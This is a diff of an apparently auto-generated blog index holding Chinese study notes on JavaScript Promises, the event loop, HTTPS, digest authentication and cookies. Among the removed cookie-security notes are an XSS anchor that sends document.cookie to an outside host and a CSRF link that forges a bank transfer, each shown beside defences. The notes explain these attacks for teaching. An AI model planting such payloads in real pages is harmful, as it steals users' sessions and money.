@@ -70,6 +70,48 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Promise-抽象异步处理" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/13/Promise-%E6%8A%BD%E8%B1%A1%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86/" class="article-date">
+  <time datetime="2020-06-13T01:28:09.000Z" itemprop="datePublished">2020-06-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/13/Promise-%E6%8A%BD%E8%B1%A1%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86/">Promise 抽象异步处理</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="promise-遵循的一些规范"><a href="#promise-遵循的一些规范" class="headerlink" title="promise 遵循的一些规范"></a>promise 遵循的一些规范</h4><ul>
+<li>promise 的实现内部必须 catch 注册的所有回调和 executor <strong><em>throw</em></strong> 的错误(或者其他错误，比如调用一个未定义的函数)，然后把 promise 的状态改变到 rejected，(即吃掉抛出的错误)；此时错误需要被后续的 .catch 方法注册的回调处理，或者被 .then 方法注册的 onRejected 方法处理，否则会报 uncaught 错误，即错误继续被抛出<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 外层 try catch 不能捕获 promise 代码里 throw 的错误</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">// 内部的实现: 把 ReferenceError: aaaaa is not defined catch 后 调用 reject 方法改变 promise 的状态，后续没有处理，所以报 uncaught 错误</span></span><br><span class="line">  <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;aaaaa()&#125;)</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'catch nothing'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        
+          <p class="article-more-link">
+            <a href="/2020/06/13/Promise-%E6%8A%BD%E8%B1%A1%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://fuqiao2017.github.io/2020/06/13/Promise-%E6%8A%BD%E8%B1%A1%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86/" data-id="ckcr1a03g000h23rpepmc4acy" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-EventLoop-并发模型与事件循环" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/06/12/EventLoop-%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B%E4%B8%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/" class="article-date">
@@ -97,21 +139,15 @@
 <p><strong><em>事件和回调函数</em></strong> :<br>  事件: 用户点击、页面滚动、ajax onload、IO 事件等等<br>  回调函数: 被挂起等待对应事件触发然后进栈执行的代码</p>
 <p><strong><em>setTimeout</em></strong> : 第二个参数为 <strong><em>最小等待时间</em></strong></p>
 <h5 id="多个运行时互相通信"><a href="#多个运行时互相通信" class="headerlink" title="多个运行时互相通信"></a>多个运行时互相通信</h5><p>一个 web worker 或者一个跨域的 iframe 都有自己的栈、堆和消息队列。两个不同的运行时只能通过 postMessage 方法进行通信。如果另一个运行时侦听 message 事件，则此方法会向该运行时添加消息</p>
-<h5 id="永不阻塞"><a href="#永不阻塞" class="headerlink" title="永不阻塞"></a>永不阻塞</h5><p>JavaScript的事件循环模型与许多其他语言不同的一个非常有趣的特性是，它永不阻塞。 处理 I/O 通常通过事件和回调来执行，所以当一个应用正等待一个 IndexedDB 查询返回或者一个 XHR 请求返回时，它仍然可以处理其它事情，比如用户输入</p>
-<h5 id="同步任务与异步任务、宏任务与微任务"><a href="#同步任务与异步任务、宏任务与微任务" class="headerlink" title="同步任务与异步任务、宏任务与微任务"></a>同步任务与异步任务、宏任务与微任务</h5><p><img src="/images/%E5%90%8C%E6%AD%A5%E4%BB%BB%E5%8A%A1%E4%B8%8E%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1.jpeg" alt=""><br>步骤:</p>
-<ol>
-<li>同步和异步任务分别进入不同的执行”场所”，同步的进入主线程，异步的进入 <strong><em>Event Table</em></strong> 并注册函数</li>
-<li>当指定的事情触发时，Event Table会将这个函数移入 <strong><em>Event Queue</em></strong><br><strong><em>注意细节</em></strong> : Event Queue 中是已经被触发的回调函数，一旦主线程空闲，队列中的第一个就会进栈执行；而 Event Table 是一个用于存储暂未触发的异步事件列表，比如还没有到达最小等待时间的 setTimeout 和 还没有成功的 ajax onload，一旦 超过最小等待时间，setTimeout 的第一个参数会被推进 Event Queue 中排队等待执行，一旦 ajax 成功，则 Onload 回调会被推进 Event Queue 中排队等待执行</li>
-<li>主线程内的任务执行完毕为空，会去Event Queue读取对应的函数，进入主线程执行</li>
-<li>上述过程会不断重复</li>
-</ol>
-<hr>
-<p><img src="/images/%E5%AE%8F%E4%BB%BB%E5%8A%A1.jpeg" alt=""><br><img src="/images/%E5%BE%AE%E4%BB%BB%E5%8A%A1.jpeg" alt=""><br><img src="/images/%E5%AE%8F%E4%BB%BB%E5%8A%A1%E4%B8%8E%E5%BE%AE%E4%BB%BB%E5%8A%A1%E7%9A%84%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F.jpeg" alt=""></p>
-
+        
+          <p class="article-more-link">
+            <a href="/2020/06/12/EventLoop-%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B%E4%B8%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/12/EventLoop-%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B%E4%B8%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/" data-id="ckclu36w5000pm2rp1vwtchh0" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/12/EventLoop-%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B%E4%B8%8E%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/" data-id="ckcr1a02z000023rpcl1fa67d" class="article-share-link">Share</a>
       
       
     </footer>
@@ -149,11 +185,14 @@
 <p>// 模板层、样式层、交互层、业务逻辑层</p>
 <p>信号与系统<br>通信相关知识<br>可以从视频入手<br>opengl</p>
 <p>linux<br>c/c++</p>
+<p>爬虫、抓包</p>
+<p>webgl</p>
+<p>webrtc</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/12/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E5%85%B3%E9%94%AE%E8%AF%8D%E5%8F%8A%E7%AE%80%E4%BB%8B/" data-id="ckclu36vz000hm2rp6ca35lf2" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/12/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E5%85%B3%E9%94%AE%E8%AF%8D%E5%8F%8A%E7%AE%80%E4%BB%8B/" data-id="ckcr1a03i000k23rpch3k36qj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -198,62 +237,16 @@
 <h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><ul>
 <li>位于安全层只上的 HTTP，这个安全层位于 TCP 之上<br><img src="/images/HTTPS%E5%AE%89%E5%85%A8%E5%B1%82.jpeg" alt=""></li>
 <li><strong><em>安全套接层协议</em></strong>（Secure Sockets Layer  SSL），后继者 <strong><em>传输层安全性协议</em></strong>（Transport Layer Security  TLS）</li>
-<li>网景(NetScape)公司首创</li>
-</ul>
-<h5 id="两种登录方式"><a href="#两种登录方式" class="headerlink" title="两种登录方式"></a>两种登录方式</h5><p><strong><em>密码口令登录</em></strong> :</p>
-<ul>
-<li>通过密码进行登录，主要流程为:<ol>
-<li>客户端连接上服务器之后，服务器把自己的公钥传给客户端</li>
-<li>客户端输入服务器密码通过公钥加密之后传给服务器</li>
-<li>服务器根据自己的私钥解密登录密码，如果正确那么就让客户端登录</li>
-</ol>
-</li>
-</ul>
-<p><strong><em>公钥登录</em></strong> :</p>
-<ul>
-<li>公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：<ol>
-<li>客户端生成RSA公钥和私钥</li>
-<li>客户端将自己的公钥存放到服务器</li>
-<li>客户端请求连接服务器，服务器将一个随机字符串发送给客户端</li>
-<li>客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</li>
-<li>服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了</li>
-</ol>
-</li>
-</ul>
-<h5 id="公私钥密码对"><a href="#公私钥密码对" class="headerlink" title="公私钥密码对"></a>公私钥密码对</h5><p><strong><em>公钥</em></strong> : 发布公钥<br><strong><em>私钥</em></strong> : 私有保密<br>RSA算法的作用:<br><strong><em>加密</em></strong> : 公钥加密私钥解密<br><strong><em>认证</em></strong> : 私钥加密公钥解密(签名)<br>公钥与私钥使用场景:　<br>(1)私钥用来进行解密和签名，是给自己用的<br>(2)公钥由本人公开，用于加密和验证签名，是给别人用的<br>(3)当该用户发送文件时，用私钥签名，别人用他给的公钥验证签名，可以保证该信息是由他发送的。当该用户接受文件时，别人用他的公钥加密，他用私钥解密，可以保证该信息只能由他接收到</p>
-<h5 id="对称加密和非对称加密"><a href="#对称加密和非对称加密" class="headerlink" title="对称加密和非对称加密"></a>对称加密和非对称加密</h5><p><strong><em>对称密钥加密技术</em></strong> : 编码时使用的密钥值和解码时一样<br><strong><em>非对称秘钥加密</em></strong> : <strong><em>公开秘钥加密技术</em></strong> 是非对称的，为编码和解码使用了不同的秘钥<br><strong><em>混合加密系统和会话密钥</em></strong> : </p>
-<ol>
-<li>通常的做法是将对称加密的密钥进行非对称加密，然后传送给需要它的人</li>
-<li>非对称加密很安全，但是和对称加密比起来，它非常的慢<br>混合使用对称和非对称策略:<br>在两节点间通过便捷的公开秘钥加密技术建立起安全通信，然后用那条安全的通道产生并发送临时的随机对称秘钥(Session key 一次性会话密钥)，通过更快的对称加密技术对其余的数据进行加密<br>(https 连接只在建立连接时，使用服务器的公钥加密，这个阶段是为了交换一个共享密钥。接下来的过程使用的是对称算法)</li>
-</ol>
-<h5 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h5><p>用私钥对报文摘要进行签名，这种方式可以验证身份以及保证报文的完整性</p>
-<h5 id="签名算法特性"><a href="#签名算法特性" class="headerlink" title="签名算法特性"></a>签名算法特性</h5><ol>
-<li>确认消息的 <strong><em>完整性</em></strong> : 对比摘要是否相等</li>
-<li>确认消息的发布者 <strong><em>不可否认性</em></strong> : 用私钥签名过的摘要，只能用同对的公钥解码</li>
-<li>确认公钥的发布者 <strong><em>认证</em></strong> :</li>
-</ol>
-<p><strong><em>RSA算法</em></strong> :</p>
-<h5 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h5><p>证书的本质就是对公钥施加数字签名<br><strong><em>站点证书的有效性</em></strong> :</p>
-<ul>
-<li>验证证书有效期(起止时间)</li>
-<li>验证证书域名(与浏览器地址栏中域名是否匹配)</li>
-<li>验证证书吊销状态(CRL+OCSP)</li>
-<li>验证证书颁发机构, 如果颁发机构是中间证书, 在验证中间证书的有效期/颁发机构/吊销状态. 一直验证到最后一层证书, 如果最后一层证书是在操作系统或浏览器内置, 那么就是可信的, 否则就是自签名</li>
-</ul>
-<h4 id="SSL-握手"><a href="#SSL-握手" class="headerlink" title="SSL 握手"></a>SSL 握手</h4><ul>
-<li>SSL 是一个二进制协议，流量端口是 443</li>
-<li>如果 SSL 流量和 HTTP 流量都从端口 80 到达，大部分 Web服务器 会将二进制 SSL 流量理解为错误的 HTTP 并关闭连接</li>
-<li>将安全服务进一步整合到 HTTP 层中去就无需使用多个目的端口了<br><img src="/images/SSL%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B.jpg" alt=""><br><img src="/images/ssl-handshake-rsa.png" alt=""></li>
-</ul>
-<h5 id="SSL-握手优化"><a href="#SSL-握手优化" class="headerlink" title="SSL 握手优化"></a>SSL 握手优化</h5><ul>
-<li>session id 复用</li>
-<li>同步的吊销检查可能耗时</li>
-</ul>
-
+<li>网景(NetScape)公司首创
+        
+          <p class="article-more-link">
+            <a href="/2020/06/12/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E5%AE%89%E5%85%A8HTTP-%E7%AC%94%E8%AE%B0/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/12/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E5%AE%89%E5%85%A8HTTP-%E7%AC%94%E8%AE%B0/" data-id="ckclu36vu000am2rp3v59e4ya" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/12/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E5%AE%89%E5%85%A8HTTP-%E7%AC%94%E8%AE%B0/" data-id="ckcr1a03d000c23rp0kqxb478" class="article-share-link">Share</a>
       
       
     </footer>
@@ -289,23 +282,16 @@
 <h5 id="用摘要保护密码"><a href="#用摘要保护密码" class="headerlink" title="用摘要保护密码"></a>用摘要保护密码</h5><p>只发送密码的摘要，两端匹配密码的摘要即可(摘要是单向的)</p>
 <p><strong><em>摘要函数</em></strong> : 摘要是对信息主体的浓缩; 摘要是一种 <strong><em>单向函数</em></strong>，用户将无限的输入值转换为有限的浓缩输出值<br><strong><em>单向函数</em></strong> : 单向函数指的是正向操作非常简单，而逆向操作非常困难的函数，比如大整数乘法。这种函数往往提供一种难解或怀疑难解的数学问题。目前,公钥密码领域具备实用性的三个怀疑难解问题为：质数分解，离散对数和椭圆曲线问题</p>
 <ul>
-<li>摘要认证首部:<br>WWW-Authenticate: Digest<br>realm=”安全域”<br>qop=”算法列表”<br>nonce=”服务器随机串令牌66c5e…”<br>Authorization: Digest<br>username=”用户名”<br>realm=”安全域”<br>qop=”选择的算法”<br>uri=””<br>nonce=”服务器随机串令牌66c5e…”<br>cnonce=”客户端随机令牌7fg62…”<br>response=”e483c9…”<br>Authentication-Info: nextnonce=”下个随机数串”<br><img src="/images/%E6%91%98%E8%A6%81%E8%AE%A4%E8%AF%81%E9%A6%96%E9%83%A8.jpeg" alt=""></li>
-</ul>
-<p><strong><em>MD5 消息摘要算法</em></strong> : 一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），显示为32个十六进制的字符，每个字符四位</p>
-<h5 id="MD5算法无法防止碰撞攻击，因此不适用于安全性认证，如SSL公开密钥认证或是数字签名等用途"><a href="#MD5算法无法防止碰撞攻击，因此不适用于安全性认证，如SSL公开密钥认证或是数字签名等用途" class="headerlink" title="MD5算法无法防止碰撞攻击，因此不适用于安全性认证，如SSL公开密钥认证或是数字签名等用途"></a>MD5算法无法防止碰撞攻击，因此不适用于安全性认证，如SSL公开密钥认证或是数字签名等用途</h5><p><strong><em>SHA</em></strong> : Secure Hash Algorithm 安全散列算法<br>目前广泛使用的是 SHA-2 系列算法，2015 年发布 SHA-3</p>
-<h4 id="用随机数防止重放攻击"><a href="#用随机数防止重放攻击" class="headerlink" title="用随机数防止重放攻击"></a>用随机数防止重放攻击</h4><h5 id="摘要认证握手机制"><a href="#摘要认证握手机制" class="headerlink" title="摘要认证握手机制"></a>摘要认证握手机制</h5><p><img src="/images/%E6%91%98%E8%A6%81%E8%AE%A4%E8%AF%81%E6%8F%A1%E6%89%8B%E6%9C%BA%E5%88%B6.jpeg" alt=""></p>
-<h4 id="预授权"><a href="#预授权" class="headerlink" title="预授权"></a>预授权</h4><ol>
-<li>预先生成下一个随机数<br>Authentication-Info: nextnonce=”下个随机数串”</li>
-<li>受限的随机数重用机制<br>服务器允许随机数重用多少次或多少秒</li>
-<li>同步生成随机数<br>客户端和服务器端根据相同的秘钥(种子)生成相同的随机数序列，(大概就是首部中不包含随机数了，随机数由客户端、服务器端自己生成)</li>
-</ol>
-<h5 id="词典攻击"><a href="#词典攻击" class="headerlink" title="词典攻击"></a>词典攻击</h5><p>对某个事务进行窃听，并对 随机数/响应 对 使用标准的密码猜测程序<br>使用预先制作好的清单</p>
-<p><strong><em>真正安全的事务只有通过 SSL 才能实现</em></strong></p>
-
+<li>摘要认证首部:<br>WWW-Authenticate: Digest<br>realm=”安全域”<br>qop=”算法列表”<br>nonce=”服务器随机串令牌66c5e…”<br>Authorization: Digest<br>username=”用户名”<br>realm=”安全域”<br>qop=”选择的算法”<br>uri=””<br>nonce=”服务器随机串令牌66c5e…”<br>cnonce=”客户端随机令牌7fg62…”<br>response=”e483c9…”<br>Authentication-Info: nextnonce=”下个随机数串”<br><img src="/images/%E6%91%98%E8%A6%81%E8%AE%A4%E8%AF%81%E9%A6%96%E9%83%A8.jpeg" alt="">
+        
+          <p class="article-more-link">
+            <a href="/2020/06/11/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E6%91%98%E8%A6%81%E8%AE%A4%E8%AF%81-%E7%AC%94%E8%AE%B0/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/11/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E6%91%98%E8%A6%81%E8%AE%A4%E8%AF%81-%E7%AC%94%E8%AE%B0/" data-id="ckclu36vs0008m2rp6sfn1jsu" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/11/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E6%91%98%E8%A6%81%E8%AE%A4%E8%AF%81-%E7%AC%94%E8%AE%B0/" data-id="ckcr1a03b000a23rp3e78764s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -352,7 +338,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/11/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6-%E7%AC%94%E8%AE%B0/" data-id="ckclu36vt0009m2rp8iym5wq0" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/11/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6-%E7%AC%94%E8%AE%B0/" data-id="ckcr1a03d000b23rp2pe2c3j8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -391,46 +377,16 @@
 <li>经过代理或网关转发的新连接，导致服务器只看到代理的IP地址 (有些代理会添加扩展的         Client-IP\X-Forwarded-For 首部)</li>
 </ol>
 <h5 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h5><p>Http 内建机制: 通过 WWW-Authenticate 首部和 Authorization 首部向 Web 站点传送用户相关信息(服务器回送 401 Login Required 状态码)<br>缺点: 繁琐，体验极差</p>
-<h5 id="胖URL"><a href="#胖URL" class="headerlink" title="胖URL"></a>胖URL</h5><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>实现持久会话的最好方式</p>
-<ul>
-<li>分类:</li>
-</ul>
-<p><strong><em>会话cookie</em></strong> : 用户退出浏览器即删除<br><strong><em>持久cookie</em></strong> : 存储在硬盘上<br>两者唯一的区别就是过期时间，如果设置了 Discard 参数，或者没有设置 Expires 或 Max-Age 参数来说明扩展的过期时间，这个 cookie 就是一个会话 cookie</p>
-<h4 id="cookie-基本思想"><a href="#cookie-基本思想" class="headerlink" title="cookie 基本思想:"></a>cookie 基本思想:</h4><p>让浏览器积累一组服务器特有的信息，每次访问服务器时都将这些信息提供给它。<br>因为浏览器要负责存储 cookie 信息，所以此系统被称为 <strong><em>客户端侧状态(client-side state)</em></strong></p>
-<h4 id="cookie-规范正式名称-HTTP-状态管理机制-HTTP-state-management-mechanism"><a href="#cookie-规范正式名称-HTTP-状态管理机制-HTTP-state-management-mechanism" class="headerlink" title="cookie 规范正式名称: HTTP 状态管理机制(HTTP state management mechanism)"></a>cookie 规范正式名称: HTTP 状态管理机制(HTTP state management mechanism)</h4><h4 id="cookie-版本"><a href="#cookie-版本" class="headerlink" title="cookie 版本"></a>cookie 版本</h4><ul>
-<li>版本0:<br>Set-Cookie 首部:<br>Cookie 首部: 将所有与 域、路径和安全过滤器匹配的未过期 cookie 都发送，且所有 cookie 都被组合到一个 Cookie 首部中</li>
-<li>版本1:<br>Set-Cookie2 首部: 多了一些可用属性，比如 Discard(说明为会话cookie)、Max-Age(相对秒数)、Port<br>Cookie2 首部: 携带更多的信息</li>
-</ul>
-<h4 id="cookie-与会话跟踪"><a href="#cookie-与会话跟踪" class="headerlink" title="cookie 与会话跟踪"></a>cookie 与会话跟踪</h4><p>第三方网站引导发出的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。</p>
-<h4 id="cookie-与缓存"><a href="#cookie-与缓存" class="headerlink" title="cookie 与缓存"></a>cookie 与缓存</h4><p>私有的内容不可缓存</p>
-<h4 id="cookie-安全问题"><a href="#cookie-安全问题" class="headerlink" title="cookie 安全问题"></a>cookie 安全问题</h4><ul>
-<li><p>cookie 相关特性: http 请求会自动携带请求所在域名的 cookie</p>
-</li>
-<li><p>CSRF (XSRF) (Cross-site request forgery) 跨站请求伪造<br>也被称为 <strong><em>one-click attack</em></strong><br>栗子: 小明刚刚在360浏览器登陆过中国银行网站，登录状态还有效，这时小明在逛一个有趣的论坛，小明在浏览一个有趣的帖子，帖子里有个人回复了留言和一个外链(<a href="http://www.chinabank.com/transfer?from=xiaoming&amount=10000&to=heike" target="_blank" rel="noopener">点我看美女</a>)，那么小明点击，浏览器就会发出一个携带 <a href="http://www.chinabank.com" target="_blank" rel="noopener">www.chinabank.com</a> 域名下的 cookie 的请求，Refer 可能是当前这个论坛的域，所以小明损失一万块<br>或者: 一个钓鱼网站有向中国银行转账接口提交的表单，诱发用户点击按钮，就会携带 cookie 提交表单</p>
-</li>
-</ul>
-<p><strong><em>防御措施</em></strong> :</p>
-<ol>
-<li>检查 Referer 字段<br>此方法完全依赖客户端浏览器发送正确的值</li>
-<li>添加校验 token<br>登录后服务器返回一个 token，前端把这个 token 添加到 http 请求的首部，攻击者无从事先得知这个 token 的值</li>
-<li>SameSite 属性<br>Set-Cookie: CookieName=CookieValue; SameSite=Strict;<br>Strict: 只有当前网页的 URL 与请求目标一致，才会带上 Cookie<br>Lax: (默认) 大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外 (导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单)<br>None: 值为 None 时，必须同时设置 Secure 属性，表示 cookie 只能通过 HTTPS 发送，Set-Cookie: widget_session=abc123; SameSite=None; Secure</li>
-<li>表单嵌入同步令牌（一个随机唯一的 token）</li>
-</ol>
-<ul>
-<li>XSS (Cross-site scripting  XSS) 跨站脚本<br>跨站脚本是代码注入的一种<br>注入下面这个代码可以获取到 cookie 并发送到 恶意网站<br>&lt;a href=”#” onclick=<code>window.location=http://abc.com?cookie=${docuemnt.cookie}</code>&gt;领取红包</a><br><strong><em>攻击手段和目的</em></strong> : 获取 cookie，获取本地存储的用户敏感信息，其他操作<br><strong><em>防御措施</em></strong> :<ol>
-<li>过滤特殊字符<br>客户端和服务器端都对输入增加正则校验，没有通过校验则客户端不允许提交，服务器端不允许入库</li>
-<li>数据转义<br>前端把需要展示到页面的数据转义，比如直接 replace script 标签，遇到 “&lt;” 或 “&gt;” 添加 “\” 转义处理</li>
-<li>设置 http-only 属性<br>cookie 有一个 http-only 属性，表示 cookie 只能被 http 请求携带，不能通过 document.cookie 获取</li>
-</ol>
-</li>
-</ul>
-<p><strong><em>cookie 会导致频繁发送 首部体积庞大 的请求</em></strong></p>
-<p>构建用户跟踪: 将持久 cookie 与 IP 地址、Referer 结合可以构建相当精确的用户档案和浏览模式信息<br><strong>第三方 cookie</strong> :<br>通常cookie的域和浏览器地址的域匹配，这被称为第一方cookie。那么第三方cookie就是cookie的域和地址栏中的域不匹配，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。<br>举个例子，用户正在访问的的正规网站的域名为 A，广告商的域名为 B。那么即使用户浏览器地址栏显示为A，但实际上浏览器做了两次请求，一次给 A 为了显示正常内容，一次给 B 为了显示广告内容。这样的话 A 和 B 实际上都可以通过浏览器使用 cookies。区别在于，A 的 cookie 值只属于A，B 的 cookie 值只属于 B。下次用户在进入网站 C 里面如果还有 B 的<iframe> 广告，那么 B 就可以通过之前在 A 网站上做的记录，给用户精准投放广告。至于 B是怎么知道用户在A上看过什么，那就是 A 和 B 之间的事了。亦或者 B 本身就是一个比较流行的网站，例如百度或者淘宝，它自己就可以记录用户习惯，然后再投到它的其他广告里。这就是为什么你在淘宝进行了搜索，然后再新浪微博页面上居然能看到该搜索有关的广告。这就是因为新浪微博的页面上有一个 <iframe> 显示了淘宝的广告。</p>
-
+<h5 id="胖URL"><a href="#胖URL" class="headerlink" title="胖URL"></a>胖URL</h5>
+        
+          <p class="article-more-link">
+            <a href="/2020/06/10/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%86%E5%88%AB%E4%B8%8ECookie%E6%9C%BA%E5%88%B6-%E7%AC%94%E8%AE%B0/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/10/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%86%E5%88%AB%E4%B8%8ECookie%E6%9C%BA%E5%88%B6-%E7%AC%94%E8%AE%B0/" data-id="ckclu36w2000nm2rp9llq3niw" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/10/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%86%E5%88%AB%E4%B8%8ECookie%E6%9C%BA%E5%88%B6-%E7%AC%94%E8%AE%B0/" data-id="ckcr1a03b000923rp8iuze8r3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -467,7 +423,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/09/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E7%AB%A0-Http-NG-%E7%AC%94%E8%AE%B0/" data-id="ckclu36vv000bm2rp841043sa" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/09/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E7%AB%A0-Http-NG-%E7%AC%94%E8%AE%B0/" data-id="ckcr1a03e000d23rp8rl21uu7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -515,25 +471,16 @@
 <li>数和散列表: 采用加速 URL 查找的数据结构</li>
 <li>有损的存在位图: 有损数据结构，对存在位置位</li>
 <li>检查点: 将已访问的 URL 保存到备份到硬盘上</li>
-<li>分类: 爬虫集群，协调工作</li>
-</ol>
-<h4 id="URL-别名"><a href="#URL-别名" class="headerlink" title="URL 别名"></a>URL 别名</h4><p>看起来不一样的URL，实际指向同一资源</p>
-<ul>
-<li>消除别名:<ol>
-<li>规范化 URL</li>
-<li>通过了解 Web 服务器的部分配置（服务器是否大小写无关、当前目录下的索引页面配置、主机名和IP地址、虚拟主机）</li>
-</ol>
-</li>
-</ul>
-<h4 id="机器人的-HTTP"><a href="#机器人的-HTTP" class="headerlink" title="机器人的 HTTP"></a>机器人的 HTTP</h4><p><strong><em>识别请求首部</em></strong> :<br>User-Agent: 发起请求的爬虫名字<br>From: 爬虫管理者的 Email 地址<br>Accept: 告诉服务器爬虫想获取的内容<br>Referer: 提供了当前 URL 的 URL<br>因为要支持虚拟主机，所以爬虫要支持 Host 首部</p>
